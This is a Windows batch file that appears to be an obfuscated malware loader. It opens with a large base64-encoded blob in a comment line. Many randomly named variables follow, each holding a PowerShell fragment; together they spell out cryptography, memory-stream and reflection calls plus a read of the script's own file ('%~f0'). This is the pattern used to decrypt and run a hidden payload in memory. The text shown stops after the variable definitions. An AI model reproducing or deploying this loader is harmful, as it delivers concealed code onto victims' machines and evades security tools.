@echo off
:: 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
set "BVeZeoPqMB=.Cry"
set "GUPCoTzaKw=vV, "
set "DQjLuBCRuz=();$"
set "VsdbFBrrHN=ct S"
set "YFdFjeubAA=zHhH"
set "HuYzhOtrye=ring"
set "JmZHlMTPFZ== [S"
set "SCvTDbrOBB=ode]"
set "sIWXOqxwQm=ewLi"
set "ggWyuaZnkp=t Sy"
set "bLAmKNxIPH=; };"
set "VxalieqzBI=O.Me"
set "EPPgRqhUbG=:('g"
set "WxukaxGLgD=trea"
set "hgZbRylOEZ=$epJ"
set "jtcoRRouDy=.IO."
set "mUZkmvqomY=CFxo"
set "DONtZDGlHU=] -j"
set "PAKAWPuFLe=('%~f0'"
set "PcxImXNtxV=PTtG"
set "FZzGsHFFiT=yste"
set "xOsYhwTAkd=iron"
set "XgzmcVKGmo=;$Zk"
set "XQZhCGzHij= [st"
set "QIKtChOMep=S46e"
set "sGvVvLbdRc=gjYA"
set "VmKPmNkGFv=lBlo"
set "vIeiSgDIzE=esaB"
set "iQowupgJwI=7;$C"
set "ZWOeaLVPgi=($AK"
set "QzafLCDXfa=$BLr"
set "uTglmJFJBi=)($R"
set "lLWrwcxgbu=gMod"
set "WprsuVBcnW=gth)"
set "ihLgspPJoD=sion"
set "TlUZKeQgkK=flec"
set "CHWFmRQkaT=($AK"
set "TPgOCfGdQm=.Len"
set "mBGPsdecQx=hy.A"
set "GokGnzgPLs=);$C"
set "GevwJmDire= = N"
set "qTOICjFgPx=s75K"
set "YPPuPgrpLD=Obje"
set "HeTaXuszRz=6esa"
set "PnqFAZsUhI=-4] "
set "NHhfSKkXAW=[]] "
set "hdUOnUqezJ=oryS"
set "CNQOsbbnlP=Zkrv"
set "XnwnDTVQoj=Disp"
set "fGoILDHSMg=File"
set "zgiuGjmbub=YXjp"
set "sfoxzjLogc=oint"
set "UDBvhmXKlh=le  "
set "EYLHPFizRW= = $"
set "hsPJWdlRcC=oin "
set "MMyWWKWKPG=$DZA"
set "fWVQFjWDfF=raph"
set "cyvQCZeMRh=ment"
set "BDUHyVboly=-1.."
set "SbiGMPGKbL=eam("
set "fEgKqxaPwr=('da"
set "OlzDDAEftY=);$f"
set "DszLRORfFd=.Mem"
set "KdvUKMZbps=Mode"
set "UPLRrCdDdG=Obje"
set "aTrceHNKpP=.Dis"
set "sMdLQsPODd=A.Su"
set "QFdCbnHDXc=j = "
